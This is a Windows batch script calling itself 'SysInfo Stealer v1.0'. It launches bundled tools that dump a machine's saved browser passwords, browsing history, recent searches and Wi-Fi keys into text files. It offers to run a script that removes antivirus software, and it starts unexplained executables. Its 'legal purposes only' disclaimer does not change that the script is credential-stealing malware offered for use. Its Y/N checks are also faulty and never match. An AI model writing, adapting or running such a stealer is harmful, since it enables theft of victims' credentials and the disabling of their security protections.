@echo off
title SysInfo Stealer v1.0 by @thehackingsage
:begin
echo It Is Only For Legal Purposes Please Don't Misuse. 
echo & read the Readme file for more information.
pause
echo Would you like to reset the data files before initliazing? (Y or N)
set /p reset=
if %reset% == "Y" goto :DoReset
if %reset% == "y" goto :DoReset
if %reset% == "N" goto :Anti-REM
if %reset% == "n" goto :Anti-REM
:DoReset
cls
echo Deleting data files...
ping localhost -n 2 >nul
del daten.txt
del history.txt
del passwords.txt
del searches.txt
del wireless_keys.txt
cls
goto :Anti-REM
:Anti-REM
echo Would you like to attempt to remove the Anti-Virus? (Y or N)
set /p Anti-REM=
if %Anti-REM% == "Y" goto :l33t
if %Anti-REM% == "y" goto :l33t
if %Anti-REM% == "N" goto :nl33t
if %Anti-REM% == "n" goto :nl33t
:nl33t
ping localhost -n 5 >nul
start auto.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
start .\App\bins\bin.exe
start .\App\history\BHV.exe /stext history.txt
start .\App\wireless_key\WKV.exe /stext Wireless_Keys.txt
pause
start .\App\options.bat
goto eof
:l33t
start .\App\avrem.bat
ping localhost -n 2 >nul
start auto.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
start .\App\CommandLine\Process.exe
start .\App\bins\bin.exe
start .\App\history\BHV.exe /stext history.txt
start .\App\wireless_key\WKV.exe /stext Wireless_Keys.txt
pause
start .\App\options.bat
goto eof
